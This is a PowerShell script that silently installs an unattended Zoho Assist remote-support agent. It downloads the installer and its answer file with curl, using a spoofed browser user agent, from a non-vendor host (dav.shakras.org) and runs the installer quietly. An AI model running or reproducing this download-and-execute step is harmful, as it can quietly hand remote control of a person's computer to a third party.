# Zoho Assist unattended install - DAV-HTTP edition
$ErrorActionPreference = 'Stop'
$dir = "$env:TEMP\zinst"
$exe = "$dir\ZA_Access.exe"
$iss = "ZohoAssistAgent.iss"
$ua  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

if (Test-Path 'HKLM:\SOFTWARE\Zoho Assist\Unattended Remote Support') { exit }

New-Item -ItemType Directory -Path $dir -Force | Out-Null

curl.exe -sS -L -f -A $ua -o $exe "https://dav.shakras.org/ZA_Access.exe"
curl.exe -sS -L -f -A $ua -o "$dir\$iss" "https://dav.shakras.org/ZohoAssistAgent.iss"

if (-not (Test-Path $exe)) { throw "EXE not downloaded" }
if ((Get-Item $exe).Length -lt 30000000) { throw "EXE short: $((Get-Item $exe).Length) bytes" }
if (-not (Test-Path "$dir\$iss")) { throw "ISS not downloaded" }
if ((Get-Item "$dir\$iss").Length -lt 80) { throw "ISS short: $((Get-Item "$dir\$iss").Length) bytes" }

$first = Get-Content "$dir\$iss" -TotalCount 1
if ($first -notmatch 'InstallShield') { throw "ISS bad header: $first" }

Set-Location $dir
Start-Process -FilePath 'ZA_Access.exe' -ArgumentList ('-qn -s -f1".\' + $iss + '"') -Wait
